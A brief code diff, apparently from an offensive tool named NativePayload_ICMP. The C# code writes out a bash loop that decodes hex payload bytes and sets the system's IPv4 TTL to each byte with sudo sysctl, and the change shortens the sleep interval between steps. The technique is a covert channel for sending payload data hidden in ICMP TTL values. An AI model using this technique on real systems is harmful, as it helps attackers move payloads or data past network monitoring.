@@ -152,8 +152,8 @@ namespace NativePayload_ICMP
                     Mycode.AppendLine("                                 str=`echo $pay | xxd -r -p`");
                     Mycode.AppendLine("                                 if [ \"$str\" != $'' ];");
                     Mycode.AppendLine("                                 then ");
-                    Mycode.AppendLine("                                 echo \"sudo sysctl net.ipv4.ip_default_ttl=\"$str \"; sleep 3;\"");
-                    Mycode.AppendLine("                                 sudo sysctl net.ipv4.ip_default_ttl=$str; sleep 3;");
+                    Mycode.AppendLine("                                 echo \"sudo sysctl net.ipv4.ip_default_ttl=\"$str \"; sleep 2;\"");
+                    Mycode.AppendLine("                                 sudo sysctl net.ipv4.ip_default_ttl=$str; sleep 2;");
                     Mycode.AppendLine("                                 fi");
                     Mycode.AppendLine("                              done");
                     if (args[0].ToUpper() == "SHTEXT")
